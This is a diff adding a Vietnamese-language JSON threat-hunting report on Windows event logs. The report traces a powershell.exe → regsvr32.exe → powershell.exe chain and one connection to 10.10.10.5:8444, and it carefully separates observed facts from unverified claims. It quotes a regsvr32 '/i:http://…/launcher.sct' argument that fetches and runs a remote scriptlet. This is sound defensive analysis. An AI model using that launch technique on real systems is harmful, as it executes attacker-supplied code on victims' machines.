@@ -1,0 +1,56 @@
+{
+  "schema_version": "threat-hunting-report/v1",
+  "verdict": "SUSPICIOUS",
+  "direct_answer": "Trong slice này, chỉ có một network connection được ghi nhận: regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) kết nối tới 10.10.10.5:8444 — 1 observation (jsonl:line:1001). Không có observation network connection nào cho cổng 80 trong context được cung cấp, nên không thể gán cổng 80 cho process nào hay đếm số observations. Chuỗi creation quan sát được: powershell.exe (PID 8648, GUID {b59756a9-89dc-5f17-1006-000000000400}) tạo regsvr32.exe (PID 9384) tại jsonl:line:97 / jsonl:line:219, sau đó regsvr32.exe (PID 9384) tạo powershell.exe (PID 9076, GUID {b59756a9-b239-5f17-5307-000000000400}) tại jsonl:line:224 / jsonl:line:283.",
+  "executive_summary": "Chuỗi parent/child powershell.exe → regsvr32.exe → powershell.exe được quan sát trên host WORKSTATION5.mordor.local, với regsvr32.exe mang command line /i:http://10.10.10.5:8444/launcher.sct và có một Sysmon Event ID 3 tới 10.10.10.5:8444. Context không chứa connection cổng 80 nào; kết quả HTTP, nội dung truyền và mục đích C2 chưa được xác minh.",
+  "technical_analysis": "Host: mọi observation creation và connection trong slice đều ghi host WORKSTATION5.mordor.local. GUID: parent powershell.exe ngoài cùng chỉ xuất hiện qua parent fields của child observation (creation_in_capture=false, GUID {b59756a9-89dc-5f17-1006-000000000400}, PID 8648) — không có record creation riêng cho nó trong slice. regsvr32.exe có GUID {b59756a9-b238-5f17-5207-000000000400}, PID 9384 (jsonl:line:97, jsonl:line:219). Child powershell.exe có GUID {b59756a9-b239-5f17-5307-000000000400}, PID 9076 (jsonl:line:224, jsonl:line:283). Dedup creation: mỗi lần tạo process được mô tả bởi hai observation (Sysmon Event ID 1 và Security 4688) nhưng là một creation duy nhất — regsvr32.exe: Sysmon 2020-07-22T03:27:53.548000Z (jsonl:line:97) và Security 4688 2020-07-22T03:27:53.590000Z (jsonl:line:219); child powershell.exe: Sysmon 2020-07-22T03:27:54.604000Z (jsonl:line:224) và Security 4688 2020-07-22T03:27:54.620000Z (jsonl:line:283). Network: fact network-process-1356a3e1f91322ca ghi regsvr32.exe (process-1356a3e1f91322ca) connected_to endpoint-c75f06bcf0f0d60d, destination 10.10.10.5 port 8444, observation_count=1, correlation_basis=host_guid_lifetime, assessment=suspicious_network_context_not_confirmed_C2; observation tương ứng là Sysmon Event ID 3 tại 2020-07-22T03:27:55.955000Z (jsonl:line:1001), source 172.18.39.5:50247. Không có observation connection cổng 80 trong context, nên phần 'process nào đi cổng 80 và bao nhiêu observations' không thể trả lời từ slice này. Giới hạn PID reuse: liên kết network–process dựa trên host/GUID/lifetime; fallback theo PID dừng ở lần creation/exit kế tiếp và có bounded age, nên PID 9384 chỉ được coi là regsvr32.exe trong khoảng lifetime GUID tương ứng; các liên kết mơ hồ được giữ tách riêng. Timestamp: canonical timestamp của các observation được chọn nằm trong khoảng 2020-07-22T03:27:53.548000Z đến 2020-07-22T03:27:55.955000Z — đây là khoảng dấu thời gian canonical của các observations được chọn, không phải thời lượng thực tế của hoạt động tấn công; raw clock (UtcTime) khác canonical timestamp được giữ nguyên, không hiệu chỉnh timezone.",
+  "attack_chain": [
+    {
+      "step_number": 1,
+      "source_entity": "powershell.exe PID 8648 GUID {b59756a9-89dc-5f17-1006-000000000400}",
+      "action": "process_spawn",
+      "target_entity": "regsvr32.exe PID 9384 GUID {b59756a9-b238-5f17-5207-000000000400}",
+      "evidence_ref": "jsonl:line:97",
+      "timestamp": "2020-07-22T03:27:53.548000Z"
+    },
+    {
+      "step_number": 2,
+      "source_entity": "regsvr32.exe PID 9384 GUID {b59756a9-b238-5f17-5207-000000000400}",
+      "action": "process_spawn",
+      "target_entity": "powershell.exe PID 9076 GUID {b59756a9-b239-5f17-5307-000000000400}",
+      "evidence_ref": "jsonl:line:224",
+      "timestamp": "2020-07-22T03:27:54.604000Z"
+    },
+    {
+      "step_number": 3,
+      "source_entity": "regsvr32.exe PID 9384 GUID {b59756a9-b238-5f17-5207-000000000400}",
+      "action": "network_connect",
+      "target_entity": "10.10.10.5:8444",
+      "evidence_ref": "jsonl:line:1001",
+      "timestamp": "2020-07-22T03:27:55.955000Z"
+    }
+  ],
+  "mitre_mappings": [],
+  "sigma_matches": [],
+  "containment_recommendations": [],
+  "unverified_claims": [
+    "Không có observation network connection cổng 80 trong context; không thể xác định process nào đi cổng 80 hoặc số observations cổng 80.",
+    "Sysmon Event ID 3 chỉ chứng minh network connection/endpoint theo fields; không chứng minh HTTP exchange hoàn tất, nội dung truyền, số byte hay exfiltration.",
+    "URL http://10.10.10.5:8444/launcher.sct trong command line chỉ là launch argument/target; không chứng minh scriptlet đã được tải hoặc thực thi.",
+    "Mục đích C2 chưa được xác nhận (assessment nguồn: suspicious_network_context_not_confirmed_C2).",
+    "Parent powershell.exe PID 8648 không có record creation trong capture (creation_in_capture=false); chỉ xuất hiện qua parent fields của child observation.",
+    "Liên kết network–process dựa trên host/GUID/lifetime; fallback PID có bounded age và dừng ở creation/exit kế tiếp, nên không loại trừ PID reuse ngoài khoảng lifetime GUID.",
+    "Context/slice này chưa đủ để kết luận về toàn bộ dataset hoặc các connection khác ngoài những gì được liệt kê."
+  ],
+  "evidence_refs": [
+    "jsonl:line:97",
+    "jsonl:line:219",
+    "jsonl:line:224",
+    "jsonl:line:283",
+    "jsonl:line:1001",
+    "creation-process-1356a3e1f91322ca",
+    "creation-process-1a7b3c442952cc5a",
+    "network-process-1356a3e1f91322ca",
+    "external-parent-f4ce0cf17a05c444"
+  ]
+}
